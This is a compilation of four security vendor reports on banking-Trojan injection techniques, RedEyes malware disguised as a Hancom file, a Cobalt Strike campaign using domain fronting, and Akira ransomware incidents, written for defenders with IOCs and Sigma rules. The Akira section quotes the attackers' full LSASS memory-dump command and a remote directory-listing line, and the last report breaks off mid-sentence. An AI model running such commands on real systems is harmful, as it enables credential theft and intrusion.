Heaven’s Gate Injection Technique Heaven's Gate is a technique used by malware, which enables a 32-bit (WoW64) process to execute 64-bit code by performing a far jump/call using segment selector 0x33.
Modern malware uses Heaven's Gate to inject into both 64-bit and 32-bit processes from a single 32-bit process on x64 systems.
This bypasses WoW64 API hooks, it hinders analysis on some debuggers, and it fails emulation on some sandboxes. 
Even though this method is old, it is still effective and frequently used. 
Trickbot and Emotet loaders use Heaven's Gate for process hollowing from a WoW64 process into a 64-bit svchost.exe (For more about process hollowing, see the section on Evasive Process Hollowing By Entrypoint Patching below).
The architecture of these two banking Trojans dictates that their main bot persists inside svchost.exe while the web content manipulation and credential stealing modules live inside the browser processes. 
Figure 6.
Emotet using Heaven's Gate in its Microsoft Outlook Messaging API (MAPI) module.
How to Prevent Heaven's Gate A WoW64 process usually goes through the wow64cpu.dll to perform the transition to x64 CPU mode.
Heaven's Gate does this transition manually. 
Prevention methods can find Heaven's Gate by inspecting whether a WoW64 process system call didn’t go through the wow64cpu.dll.
This can be done by placing hooks on critical APIs, generating a stack trace and inspecting the stack trace for wow64cpu.dll. 
Figure 7.
WoW64’s normal syscall flow.
Evasive Process Hollowing by Entrypoint Patching Process hollowing is a process injection technique that creates a new legitimate process in a suspended mode, unmaps its main image and replaces it with malicious code.
The malicious code is written into the newly created process and the suspended thread context instruction pointer is changed using NtGetContextThread/NtSetContextThread. 
Security product vendors check for main image unmapping combined with the usage of NtGetContextThread/NtSetContextThread to detect process hollowing. 
A known technique for evading detection is to patch the process entry point with a small jump that redirects execution to the payload without actually using NtGetContextThread/NtSetContextThread functions or unmapping the main image.
For example, Trickbot and Kronos have both used this technique. 
Kronos mapped a suspended svchost.exe into its own process and patched it in its own memory address space.
Similar to other banking Trojans, Kronos' main module ran within svchost.exe and orchestrated the whole operation from the remote svchost.exe process. 
Trickbot implemented process hollowing by first using VirtualProtectEx on the process entrypoint, and then writing the hook stub using WriteProcessMemory. Figure 8.
Kronos mapping svchost.exe and patching its entrypoint.
Figure 9.
Kronos hook stub template – x86 opcodes for push and ret.
How to Prevent Evasive Process Hollowing by Entrypoint Patching This technique can be prevented either by inspecting whether the address argument provided to the calls of NtWriteVirtualMemory or NtProtectVirtualMemory is a remote process entry point or by detecting suspicious remote mapping and reading of svchost.exe memory. 
PE Injection Common injection methods used by banking Trojans involve writing a mapped PE into a remote process using WriteProcessMemory.
Some malware families try to obscure the call by wiping artifacts from the buffer, such as wiping the PE header. 
For example, Zeus variants use this technique to inject themselves into other processes, allowing them to stay hidden, as well as to perform webinjects and to perpetrate financial data theft. Figure 10.
Zeus injection code from its leaked source code.
How to Prevent PE Injection This technique can be prevented by inspecting the buffer sent to NtWriteVirtualMemory for executable artifacts. 
Process Injection via Hooking Hooking can be used as an injection technique.
Injecting a banking Trojan’s main payload into a legitimate-looking process maintains stealth and helps avoid endpoint protection detection. 
This technique utilizes hooking to get code execution, usually by hooking a frequently called API function with a jump to a payload/shellcode.
This avoids calling any suspicious APIs often used in code injection techniques like CreateRemoteThread or NtSetContextThread. 
For instance, IcedID injects its main bot into a hollowed instance of svchost.exe using API hooking.
This is also known as the ZwClose technique (ZwClose was the hooked API in Zberp, the first to employ this injection technique in the wild). 
The injection flow of IcedID is slightly different than that of Zberp.
It first hooks NtCreateUserProcess and then calls CreateProcessA to create svchost.exe without any special parameters or argument.
In a regular flow, the newly created svchost.exe should terminate right away. 
Figure 11.
IcedID initiates svchost.exe hooking.
Figure 12.
IcedID hooks NtCreateUserProcess.
However, because IcedID hooked NtCreateUserProcess, the hook handler is called right after the call to CreateProcessA. In the handler, it performs the following activities: Unhooks NtCreateUserProcess Calls NtCreateUserProcess (which creates svchost.exe) Decompresses a local buffer that contains the payload to inject using RtlDecompressBuffer Allocates memory for the payload at the remote svchost.exe process Writes the payload into the remote svchost.exe using NtAllocateVirtualMemory and ZwWriteVirtualMemory 
For the execution, IcedID hooks RtlExitUserProcess in the newly created svchost.exe with a jump stub to the payload.
As mentioned, svchost.exe was created without any parameters and it will try to exit.
However, due to the IcedID hook, it will jump to the payload. 
Figure 13.
IcedID hooks RtlExitUserProcess.
How to Prevent Injection via Hooking This technique can be prevented by inspecting calls to NtProtectVirtualMemory and NtWriteVirtualMemory.
The provided address argument for NtProtectVirtualMemory is an exported function from one of the Windows libraries, and the NtWriteVirtualMemory written buffer is a hooking stub.
In both cases, the remote process has to be a known injection target. 
AtomBombing Injection Technique AtomBombing is a technique that allows malware to inject code while avoiding calling suspicious APIs that security vendors are watching.
Dridex uses a slightly modified AtomBombing technique that injects one of its stages into a Windows process (usually explorer.exe) and employs various steps to cause financial data theft. 
Malware using the AtomBombing technique first writes the payload into the global atom table, which can be accessed by all processes.
They then dispatch an asynchronous procedure call (APC) to the APC queue of a target process thread using NtQueueApcThread, forcing the target process to call GlobalGetAtomA. 
The target thread then retrieves the payload from the global atom table and inserts it into a read/write (RW) region inside the target process memory space (a code cave inside the kernelbase.dll data section).
The payload has to be split into NULL-terminated strings and an atom is created for each string. 
For the execution, the injector process dispatches another APC using NtQueueApcThread to force the remote process to execute NtSetContextThread.
The injected process then calls NtSetContextThread, which invokes a return-oriented programming (ROP) chain that allocates execute/read/write (RWX) memory.
The ROP chain then copies the payload from the RW region into the newly allocated RWX region, and lastly, executes it. 
The unique idea behind AtomBombing is the write-primitive, which allows writing to the remote process using atom tables and APC. 
Dridex uses a variation of AtomBombing that queues an APC to call memset to clean an RW region in ntdll.dll.
Then, it copies the payload and its import table into the target process using the same write technique into the ntdll.dll RW region. 
For the execution, Dridex modifies the copied payload memory into executable memory using NtProtectVirtualMemory.
Then it hooks GlobalGetAtomA by calling NtProtectVirtualMemory and by using the same write primitive.
Finally, it queues an APC into the patched GlobalGetAtomA to get the payload running. Figure 14.
AtomBombing proof of concept code.
How to Prevent AtomBombing and its Variants 
These techniques can be prevented by inspecting whether the arguments provided to NtQueueApcThread/NtSetContextThread calls point to a suspicious API – the APC routine argument in the case of NtQueueApcThread, or the new instruction pointer in the context argument in the case of NtSetContextThread.
Both API calls have to be called into a remote process. 
Conclusion Threat actors who are in it for the money use a wide range of malware techniques for injection and financial fraud, and they are always looking for new ways to develop evasive techniques.
We have explored some of the more interesting banking Trojan techniques and how they’re used to steal victims’ sensitive data.
And finally, we describe how these techniques can be used to detect malicious behavior, so it can be prevented. 
Palo Alto Networks customers using Cortex XDR receive protections from such attacks in different layers, including the following: Local Analysis Machine Learning module Behavioral Threat Protection Behavioral indicators of compromise (BIOC) and Analytics BIOCs rules These layers identify the tactics and techniques that banking Trojans use at different stages of their execution. 
Palo Alto Networks customers also receive protections against the attacks discussed here through the WildFire cloud-delivered security subscription for the Next-Generation Firewall. Indicators of Compromise Trickbot testnewinj32Dll.dll:
4becc0d518a97cc31427cd08348958cda4e00487c7ec0ac38fdcd53bbe36b5cc Webinjects: ef6603a7ef46177ecba194148f72d396d0ddae47e3d6e86cf43085e34b3a64d4 Emotet: dd20506b3c65472d58ccc0a018cb67c65fab6718023fd4b16e148e64e69e5740 Kronos: aad98f57ce0d2d2bb1494d82157d07e1f80fb6ee02dd5f95cd6a1a2dc40141bc Zeus: 0f409bc42d5cd8d28abf6d950066e991bf9f4c7bd0e234d6af9754af7ad52aa6 IcedID: 358af26358a436a38d75ac5de22ae07c4d59a8d50241f4fff02c489aa69e462f Dridex: ffbd79ba40502a1373b8991909739a60a95e745829d2e15c4d312176bbfb5b3e Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
title: Tracking Traces of Malware Disguised as Hancom Office Document File and Being Distributed (RedEyes) url: https://asec.ahnlab.com/en/53377/ AhnLab Security Emergency response Center (ASEC) has confirmed the distribution of malware disguised as Hancom Office document files.
The malware that is being distributed is named “Who and What Threatens the World (Column).exe” and is designed to deceive users by using an icon that is similar to that of Hancom Office.
Decompressing the compressed file reveals a relatively large file with a size of 36,466,238 bytes. 
AhnLab Endpoint Detection and Response (EDR) is capable of detecting such attack techniques through its trace data, and it allows users to check the data required to investigate the related breach case. 
Figure 1.
Execution flow diagram Figure 1 depicts the icon of the malware and its overall execution.
It provides a visual representation of which processes are used when the malware is executed. Figure 2.
File trace data of malware creation Figure 3.
Primary trace data of malware Figures 2 and 3 show the trace data of key behaviors within the overall flow of the malware.
In Figure 2, a trace can be observed of the malware creating a folder named onedrivenew in the AppData directory and self-copying itself with the filename onedrivenew.exe to appear as a normal file.
In Figure 3, a trace can be seen of the malware creating and executing a normal Hancom Office file with the same filename as the malware within the same directory where the malware was executed.
The malware is injected and executed within the normal Windows process called mstsc.exe.
The original file is deleted using the cmd command. 
Figure 4.
Trace data of the normal Windows process, mstsc.exe Figure 4 displays the trace data of mstsc.exe being executed after being injected with malware.
The malware registers its file with the name onedrivenew under the Run key in order to make it run after the system is rebooted.
Afterward, it uses the schtasks.exe command to register the file to the task scheduler with the name OneDriveOp to connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.
The URL registered in the task scheduler appears to be a normal homepage, but it contains a web shell.
The inserted web shell has been confirmed to be similar to the one posted in “Targeted Attack on a Website Developed by a Specific Web Design Company (Red Eyes and APT37)” on the AhnLab Threat Intelligence Platform. 
When it comes to targeted attacks, there are factors that general users may struggle to deal with.
Even if users find themselves exposed to such threats, AhnLab EDR can provide trace data for appropriate responses. 
[File Detection]– Trojan/Win.
Agent.
R580958
(2023.05.24.02) 
[IOC]MD5 – 93fc0fb9b87a00b38f18c1cc4ee02e50 C2 – hxxp://ingarchi.com/bbs/data/culture– hxxp://ingarchi.com/bbs/data/culture/getcfg.php AhnLab EDR protects the endpoint environment by delivering behavioral detection, advanced analysis, holistic visibility, and proactive threat hunting.
For more information about the product, please visit our official website. 
The post Tracking Traces of Malware Disguised as Hancom Office Document File and Being Distributed (RedEyes) appeared first on ASEC BLOG. 
title: Attackers use domain fronting technique to target Myanmar with Cobalt Strike url: http://blog.talosintelligence.com/2021/11/attackers-use-domain-fronting-technique.html By Chetan Raghuprasad, Vanja Svajcer and Asheer Malhotra. 
News Summary Cisco Talos discovered a new malicious campaign using a leaked version of Cobalt Strike in September 2021. 
This shows that Cobalt Strike, although it was originally created as a legitimate tool, continues to be something defenders need to monitor, as attackers are using it to set up attacks. 
The threat actor in this case uses domain fronting with the Cloudflare Content Delivery Network, redirecting a Myanmar government owned-domain to an attacker-controlled server. 
The threat actor employed the tactic of re-registering reputed domains in their attack chains to evade detections. 
This threat demonstrates several techniques of the MITRE ATT&CK framework, most notably T1202 - Indirect Command Execution , T1027 - Obfuscated Files or Information, T1105 - Ingress Tool Transfer, T1071.001 - Application Layer Protocols:Web Protocols. 
What's New? Cisco Talos discovered a malicious campaign using an obfuscated Meterpreter stager to deploy Cobalt Strike beacons in September 2021.
The actor used a domain owned and operated by the Myanmar government, the Myanmar Digital News network, as a domain front for their beacons. 
The evolution of this threat indicates that the attackers have been active since at least August 2021 using a combination of Meterpreter stagers and Cobalt Strike beacons to establish presence on victim's endpoints. 
How did it work? 
The malware is typically a loader that runs on a victim machine, decodes and executes the Cobalt Strike beacon DLL via reflective injection.
It loads several libraries during the runtime and generates the beacon traffic according to the embedded configuration file.
The configuration file contains the information related to the command and control (C2) server which instructs the victim's machine to send the initial DNS request attempting to connect to the host of the Myanmar government-owned domain www[.]mdn[.]gov[.]mm.
The site is hosted behind the Cloudflare content delivery network and the actual C2 traffic is redirected to an attacker controlled server test[.]softlemon[.]net based on the HTTP host header information specified in the beacon's configuration data. 
So what? 
Cobalt Strike has been used by many actors in the past and is a de-facto standard tool for post-exploitation activities and pivoting.
Attackers use it to deploy a wide range of payloads, from commodity malware, to sophisticated state-sponsored activities. 
Cobalt Strike allows actors to shape the traffic of beacons to mimic legitimate traffic patterns.
One of the techniques to conceal the traffic from DNS-based filtering is Domain Fronting.
Domain fronting uses legitimate or high-reputation domains to remain undetected by defenders.
The attacker's choice of Myanmar-specific domains for domain fronting may indicate an interest in the geopolitics of this area of the world. 
In this campaign, the actor used staged payloads using the Meterpreter stager, which gives an indication that the beacon will be used for further attacks.
The defenders should be constantly vigilant and monitor network traffic to detect Cobalt Strike activities, since it is one of the most commonly used offensive tools by crimeware and APT operators. 
Evolution of the campaign A study of the evolution of the campaign shows the actor experimenting with different combinations of hosts with the intent of perfecting the domain fronting technique. 
The earliest beacon discovered around the middle of August 2021 contains the C2 URI set to test[.]softlemon[.]net while the HTTP Get and Post requests headers are pointing to dark-forest-002[.]president[.]workers[.]dev which is a Cloudflare serverless workers domain.
The default host header configuration for request contains the host name test[.]softlemon[.]net, which is also used by more recent samples. 
Another sample discovered in late August 2021 consisted of the C2 host URI xxx[.]xxxx[.]tk and the host header setting configured to point to test[.]softlemon[.]net. 
Beginning September 2021, the attackers started using the Myanmar Digital News domain for fronting their beacons.
While the default C2 domain was specified as www[.]mdn[.]gov[.]mm, the beacon's traffic was redirected to the de-facto C2 test[.]softlemon[.]net via HTTP Get and POST metadata specified in the beacon's configuration. 
The actor likely changed the configuration to test their infrastructure and the domain fronting functionality before launching the attack.
Based on the beacon configuration template and the real C2 host test[.]softlemon[.]net, we assess with moderate confidence that the samples are created by a single actor. 
Timeline of malware samples first seen in the wild. 
Cobalt Strike beacon configurations 
We extracted the beacon config from the payload that showed us the actor has used different values for the User Agent, C2-Server and Host-header in different malwares of this campaign. 
The beacon configuration of samples usually has a User Agent, which is Mozilla compatible and of Windows 7. C2 server, UserAgent and de-facto C2 variations in the beacons. 
Watermark The Cobalt Strike watermark is a number generated from the license file and is unique to a Cobalt Strike license.
The watermark on the beacons used in this campaign was 305419896 (hex: 0x12345678). 
This particular watermark has previously been attributed to a leaked Cobalt Strike version and is unsurprisingly used by other malicious actors, such as Maze ransomware and Trickbot groups, making attribution based on the watermark number impossible.
It is difficult to assess if the usage of the previously registered expired domain for C2 server and the leaked Cobalt Strike point to an increased operational security awareness of the actor or to limited resources available to them. 
Domain fronting The actor in this campaign has used domain fronting, which is a technique which can use high reputation domains to conceal the Cobalt Strike command and control traffic.
A government domain of Myanmar www[.]mdn[.]gov[.]mm was used in this particular instance. 
The fronted domain mdn[.]gov[.]mm is a legitimate domain of Myanmar Digital News, a state-owned digital newspaper.
This website has previously been compromised in February by the Brotherhood of Myanmar group, a collection of militia groups.
Although there are no indications that the previous defacement of the domain by the Brotherhood of Myanmar and the campaign described in this post are related, the domain itself is clearly of interest to various actors. 
Domain fronting can be achieved with a redirect between the malicious server and the target.
Malicious actors may misuse various content delivery networks (CDNs) to set up redirects of serving content to the content served by attacker-controlled C2 hosts.
Cloudflare is one of the CDN services that provides its users with a globally distributed cache for files hosted on their servers.
Cloudflare identifies distributions by the FQDN used to request resources.
Cloudflare users have the option to use their own subdomain and create a DNS record that points to Cloudflare.
This subdomain tells Cloudflare to associate that DNS record with a specific distribution. 
The beacon calls home www[.]mdn[.]gov[.]mm,/api/3 and has set the Host header to the actual C2 server test[.]softlemon[.]net.
The beacon traffic resolves to a Cloudflare IP address.
The DNS request that led them there will be lost and relies on other parts of the HTTP request, including the Host header and the actual C2 test[.]softlemon[.]net. 
Summary of domain fronting of Myanmar government's domain. 
Cobalt Strike payload The beacons are of particular interest due to the domain fronting technique using a government host as the initial DNS lure.
The MITRE ATT&CK framework techniques used by this malware are: T1202 - Indirect Command Execution T1027 - Obfuscated Files or Information T1105 - Ingress Tool Transfer T1071.001 - Application Layer Protocols:Web Protocols 
We also analysed the loader binary to find specifics of its memory loading and functionality. 
We spotted a suspicious section .kxrt with the packed and encoded malicious code.
The malware links several functions at runtime and has the Meterpreter staging code. 
When the malware runs, the .tls section runs first, loads the libraries and starts the execution of the malicious code at the entry point in the .kxrt section.
The entry point code calls a function to allocate virtual memory in its own process space. Function at address 00401550 shows the allocation of virtual memory. 
The loader next calls the VirtualProtect function to set the virtual memory page permissions to Read-Write-Execute and writes the image base of the Cobalt Strike beacon which will be executed in a new thread. 
Function sets the virtual memory page permission to Read-Write-Execute. 
We spotted two libraries linking during runtime.
Aside from this, there are several other standard libraries the malware links during the runtime. 
Function that loads library during the runtime. 
After allocating the virtual memory and setting the page permissions to Read-Write-Execute, a decryption routine is executed that decrypts the remaining malicious code in the .kxrt section and writes it to the virtual memory. 
Decoder routine to decrypt the beacon DLL. 
The decrypted malicious code is the actual Cobalt Strike beacon.
Once decoded, the loader's execution jumps to the beginning of the DLL resulting in a reflective-load of the beacon into the loader process memory.
This beacon is now responsible for decoding the configuration. 
Stack view of info loaded from the beacon config. 
The beacon resolves the proxy by calling WinHTTPGetProxyForUrlEx and WinHTTPCreateProxyResolver to bypass the proxy for the URL. 
Function that resolves the victim's system proxy for the URL. 
Soon after that, the beacon initiates the Cobalt Strike beacon traffic to the C2 server.
The DNS request for the initial host resolves to a Cloudflare-owned IP address that allows the attacker to employ domain fronting and send the traffic to the actual C2 host test[.]softlemon[.]net, also proxied by Cloudflare. 
At the time of analysis, the sample C2 host infrastructure was not online and we received a 404 error. 
Cobalt Strike beacon traffic. 
The beacon contains techniques to detect debuggers using GetTickCount, IsDebuggerPresent and the NtDelayExecution call to delay the execution of the malware for evading sandbox-based dynamic analysis systems.
The beacon can also manage the system power policies registry keys to set the minimum and maximum sleep times and the lid open and close action policy. 
The beacon modifies the victim's system power and lid open/close policies in the registry. 
Command and control The C2 server - test[.]softlemon[.]net is the subdomain of softlemon[.]net.
The domain softlemon[.]net was registered under Google domains until August 2019 and likely expired since then.
The malicious actor re-registered this domain on Aug. 5, 2021.
The SSL certificate for the domain softlemon[.]net with the serial number 4aa6af6d719bfdd1c6dff3d7b640aed7ee3was issued by Let's Encrypt, a free SSL certificate provider. 
The Talos reputation engine has classified it as an untrusted domain and Cisco Umbrella shows a spike in the DNS queries in September 2021.
This activity is consistent with the evolution of the Cobalt Strike beacons illustrated earlier the attackers started instrumenting beacons fronted with the Digital News domain at the beginning of September. 
DNS spike for test[.]softlemon[.]net queries vs dates. 
Our research uncovered that the C2 test[.]softlemon[.]net is a Windows server running Internet Information Services (IIS). 
IIS service response rendered from the host test[.]softlemon[.]net. 
According to Shodan, the IP address 193[.]135[.]134[.]124 hosted by a Russian provider may be the real C2 IP address protected by the Cloudflare infrastructure as the SSL certificate served on port 8443 belongs to Cloudflare and lists the X509v3 Subject Alternative Name as DNS:*.softlemon.net. 
Conclusion Domain fronting is a technique used by attackers to circumvent protection based on DNS filtering.
In this campaign, a malicious Cobalt Strike beacon is configured to take advantage of a mechanism used by Cloudflare and other content distribution networks to instruct the proxy about the host to be used for serving the content. 
When the beacon is launched, it will submit a DNS request for a legitimate high-reputation domain hosted behind Cloudflare infrastructure and modify the subsequent HTTPs requests header to instruct the CDN to direct the traffic to an attacker-controlled host. 
Defenders should monitor their network traffic even to high reputation domains in order to identify the potential domain fronting attacks with Cobalt Strike and other offensive tools.
XDR tools should be deployed to endpoints in order to detect behavior of Cobalt Strike loaders and Meterpreter stagers as they are frequently used by a wide range of actors. 
Coverage Ways our customers can detect and block this threat are listed below. 
Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post.
Try Secure Endpoint for free here. 
Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. 
Cisco Secure Malware Analytics (formerly Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. 
Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network.
Sign up for a free trial of Umbrella here. 
The following ClamAV signatures have been released to detect this threat: Win.
Backdoor.
CobaltStrike-9909816-0 Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. IOCs Hashes 658d550322cefa6efc51fbfd1a3e02839d1e519a20f8f17f01c534c0eaf36f27 e806e55713b9e46dc7896521ffb9a8b3abaa597147ea387ff2e93a2469546ba9 a0aec3e9cb3572a71c59144e9088d190b4978056c5c72d07cb458480213f2964 Network IOCs Hosts test[.]softlemon[.]net dark-forest-002.president[.]workers[.]dev IP addresses 193[.]135[.]134[.]124 URLs hxxp://test[.]softlemon[.]net:8081/api/3 hxxp://test[.]softlemon[.]net/ tcp://test[.]softlemon[.]net:8080/ hxxps://193[.]135[.]134[.]124:8443 hxxp://193[.]135[.]134[.]124:8080 hxxp://193[.]135[.]134[.]124:8081 
title: Akira Ransomware is “bringin’ 1988 back” url: https://news.sophos.com/en-us/2023/05/09/akira-ransomware-is-bringin-88-back/ On April 6, 2023, the Sophos Incident Response team was engaged to support a ransomware victim organization in North America.
The following week on April 12, 2023, yet another North American organization contacted Sophos for assistance. 
While the incidents appeared to be the work of two different criminal actors, both deployed a recently emerged ransomware called Akira.
In both cases, the affected organizations had files encrypted with the “.akira” extensions and had nearly identical ransom note files, named fn.txt, dropped in the process (as shown below in Figure 1]. Figure 1: “fn.txt” ransomware notice This Akira ransomware bears no code similarity to a previous ransomware strain with the same name that was active in 2017 and is likely unrelated.
The new jQuery-based leak site (Figure 2), with its retro green colors, has garnered most of the attention, as it accepts commands instead of listing out information. 
However, cool as their leak site design may be, this matters none to victims of this ransomware, which regrettably includes a daycare service in Canada.
While the total number of victim organizations (Figure 3) are still relatively small in comparison to Lockbit or BlackCat/APLHV, that is how all new ransomware families begin. 
Figure 3: Timeline analysis of Akira victims In this blog post, we will compare two separate incident attack flows, illustrating how different threat actors are deploying Akira ransomware.
Please note that available data on the second incident is limited, but we are highlighting deviations between the two incidents.
This information will provide organizations with detailed guidance on what they need to defend against to protect their businesses. 
Attack Flow Details Initial Access Incident #1 A user account purposedly configured to allow for Multi-Factor Authentication (MFA) bypass. 
[T1078 – Valid Accounts]
[T1133 – External Remote Service] External IP access from the threat actor was routed through European TOR VPN exit nodes. 
Incident #2 VPN access using Single Factor authentication. 
[T1133 – External Remote Service] Guidance Replacing password-only authentication with MFA remains one of the highest return-on-investment (ROI) security controls, however special attention must be given to auditing for any accounts with bypass exceptions.
Also, its recommended that organizations block any inbound traffic from TOR networks where perimeter controls are available. 
Credential Access Incident #1 Minidump of LSASS process memory leveraging comsvcs.dll with proxy execution by rundll32.exe. 
[T1003.001 – OS Credential Dumping:
LSASS Memory]
[T1569 – System Services] Service Name: TcwvBcuf Action: %COMSPEC% /Q /c
cmD.Exe /Q
/c for /f ""tokens=1,2 delims= "" ^%A in ('""tasklist /fi ""Imagename eq lsass.exe"" | find ""lsass""""') do rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\FP4.docx full" The use of a .docx extension is not as common as .dmp or .txt 
The service name is a random eight characters and different strings were observed across different systems. 
Credential access activity also occurred over the network, as this Sophos endpoint detection indicates: ‘Creds_4h (T1003.002)’ malicious behaviour detected in ‘C:\Windows\System32\svchost.exe’ Incident #2 While execution details are limited, multiple systems had the file C:\Windows\MEMORY.DMP created prior to ransomware execution correlating with Windows event log data. 
[T1569 – System Services] [4656 / 0x1230] Source Name: Microsoft-Windows-Security-Auditing Strings:
['S-1-5-18’ ‘<Redacted>$' ' Redacted>' '0x00000000000003e7' 'Security' 'Process' '\Device\HarddiskVolume3\Windows\System32\lsass.exe' '0x0000000000000524' '{00000000-0000-0000-0000-000000000000}' '%%
4490 %%4492 ' '-' '0x00001400' '-' '0' '0x0000000000001318' 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' '-'] Guidance Dumping process memory to obtain credentials is a pervasive technique observed in most ransomware incidents.
Aside from ensuring full coverage of your endpoint agent, special care should be taken to segment domain admin accounts from workstation admin accounts to reduce the impact of credential dumping when it does occur.
This is also a great candidate for a repeatable hunt, using a structured method to look for variations in the pre- and post-dumping activity that may have bypassed your existing detections.
Listed below is a Sigma rule that can be used by defenders to detect or hunt on the credential access technique used above. 
title: Using the Minidump function of comsvcs.dll description: The minidump function of comsvcs.dll can be used to dump lsass.exe.
The function requires the PID of lsass.exe. 
In addition, the Minidump function can be called using #24 rather than its name. 
author: Sophos MDR logsource: category: process_creation product: windows detection: selection: process_name|wildcard: - sc.exe - cmd.exe - powershell.exe command_line_filter: command_line|re: .*comsvcs.*(minidump|#24).
* condition: selection AND command_line_filter falsepositives: - Penetration testing level: high tags: - attack.credential access #TA0006 - attack.
T1003.001 Discovery Incident #1 Conducting discovery indirectly via schedule tasks named “Windows Update” performing remote directory listings. 
[T1083 – File and Directory Discovery]
[T1053.005 – Scheduled Task/Job: Scheduled Task] C:\>type c:\programdata\HP\ms.bat dir ""\\10.1.100.64\c$\ProgramData"" >> C:\programdata\HP\svr_dir.txtt" Leveraging a dual-use tool, PCHunter64, to acquire detailed process and system information. 
[T1082 – System Information Discovery]
[T1105 – Ingress Tool Transfer] URL: :2023040620230407:
administrator@https://www.google[.]com/url?esrc=s&q=&rct=j&sa=U&url=https://m.majorgeeks[.]com/files/details/pc_hunter.html Access count: 1 URL: Visited: administrator@hXXps://temp[.]sh/PewtN/PCHunter64.exe Access count: 9 The threat actor initially searched online for the tool before staging it for future downloads using a public cloud hosting service. 
Incident #2 Utilization of a dual-use tool, Advanced IP Scanner, to discover other systems and networks. 
[T1018 – Remote System Discovery] Prefetch [ADVANCED_IP_SCANNER_2.5.4594.] was executed - run count 2 hash:
0xC2980947 volume: 1
[serial number: 0x22E2CC6E device path: \VOLUME{01d89216e27acb2f-22e2cc6e}] Employing an existing IT tool, LANSweeper, to access detailed network and system information. 
[T1018 - Remote System Discovery]
[T1087 - Account Discovery: Domain Account] Visited: <redacted>@file:///C:/ProgramData/AdComputers.csv Visited: <redacted>@file:///C:/ProgramData/AdSubnets.csv Visited: <redacted>@file:///C:/ProgramData/AdOUs.csv Visited: <redacted>@file:///C:/ProgramData/AdUsers.csv URL F[:]/IT/Backups/Database/LANSweeper%20SQL+Key/Encryption.txt The threat actor accessed the decryption key to facilitate gaining reconnaissance information without doing any noisy discovery scanning. 
Guidance Understanding the intention of a dual-use tool being executed is challenging; however, it’s best practice to document which tools are approved for corporate use and block all others by default until they can be reviewed.
This has the added benefit of reducing shadow IT risk as well.
Additionally, just like high value business data, access to both the tool and the output of vulnerability scanners and asset discovery applications should be restricted and audited.
We have also included an example Sigma detection rule for the activity shown in incident #1. title: Listing Directories of Remote Hosts description: Threat actors can use windows binaries and commands to discover interesting to them directories on remote hosts and redirect the output to a file on disc for later consumption. 
author: Sophos MDR logsource: category: process_creation product: windows detection: selection: Image|endswith: - 'cmd.exe' - 'powershell.exe' CommandLine|contains: - 'dir *\\*\c$\*>>' - 'ls *\\*\c$\*>>' filter: 
ParentImage|endswith: - 'java.exe' condition: selection and not filter falsepositives: - Possible from admin activity level: high tags: - attack.discovery #TA0007 - attack.
T1083 Lateral Movement Incident #1 There were no network restrictions on Remote Desktop Protocol (RDP), and the threat actor was able to move freely across the network; as a result, this activity was captured by multiple event types. 
Event ID [1149] - RDP connection established Event ID
[1149] RDP from from IP: <Redacted> Event ID: 25 - Remote Desktop Services: Session reconnection succeeded Event ID: 24 - Remote Desktop Services: Session has been disconnected Event ID
[4624] RDP Type "3" from IP: <Redacted> - Device: <Redacted> 
[HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\<Redacted>]
Username hint: <Redacted> "<Provider Name=""Microsoft-Windows-RemoteDesktopServices-RdpCoreTS"" Guid=""{1139C61B-B549-4251-8ED3-27250A1EDEC8}"" /> <EventID>131</EventID> <Version>0</Version> <Level>4</Level> <Task>4</Task> <Opcode>15</Opcode> <Keywords>0x4000000000000000</Keywords> <TimeCreated SystemTime=""2023-04-06T09:23:41.969586500Z"" /> <EventRecordID>633</EventRecordID> <Correlation ActivityID=""{F4208FE1-4D5D-45DF-B8E2-A851AC3F0000}"" /> <Execution ProcessID=""1136"" ThreadID=""2228"" /> <Channel>Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational</Channel> <Computer> <Redacted> </Computer> <Security UserID=""S-1-5-20"" /> </System> <EventData> <Data Name=""ConnType"">TCP</Data> <Data Name=""ClientIP""> <Redacted>:56736</Data> </EventData> </Event>" Incident #2 Similar to Incident #1, the threat actor was able to RDP unencumbered across the organization’s infrastructure. 
Guidance Securing RDP access can be difficult for many companies, but it is a project worthy of investment.
The first item to check off the box is to restrict by role, which accounts can access other systems using RDP.
The overwhelming majority of users do not need this access.
Secondly, adopting a centralized jump server, which only admins can access with MFA and blocking at the network level other system to system RDP is a strong preventative control.
Lastly, a detection should be in place to promptly review anomalous RDP connections to deconflict them with approved system administration activity. 
Defense Evasion Incident #1 The threat actor executed two actions to bypass Windows Defender [T1562.001 – Impair Defenses: Disable or Modify Tools] 5001 - Real-time Protection was disabled New Value">HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\ Guidance The first line of defense available to organizations is to use a security agent that has robust tamper protection.
In terms of monitoring for this activity, these are detection-ready event sources.
While its possible a system administrator would make such exceptions during troubleshooting, given the risk of this activity, it’s something that should be investigated promptly if a corresponding support ticket isn’t found. 
Command and Control Incident #1 During this incident, the threat actor leveraged one of the most popular dual-use agents, AnyDesk, to provide persistent remote access into the affected organization on multiple systems. 
[T1219 – Remote Access Software] UserAssist entry: 86 Value name: C:\Users\administrator.<Redacted> \AppData\Local\Microsoft\Windows\INetCache\IE\14J9H2AA\AnyDesk.exe Count: 1 Event ID [7045] "Service Name: Anydesk" "C:\Program Files (x86)\AnyDesk\AnyDesk.exe"" --service" Prefetch
[ANYDESK.EXE] was executed - run count 9 path: \PROGRAM FILES (X86)\ANYDESK\ANYDESK.EXE hash: 0x389EE9E9 volume:
1 [serial number: 0x7077BC2C device path: \VOLUME{01cf89bc76f2a351-7077bc2c}] Incident #2 The threat actor almost immediately installed Cloudflare’s freely available tunnelling software here, C:/ProgramData/windows_update.exe, followed by the download and execution of another dual-use agent, Radmin [T1572 – Protocol Tunneling ]
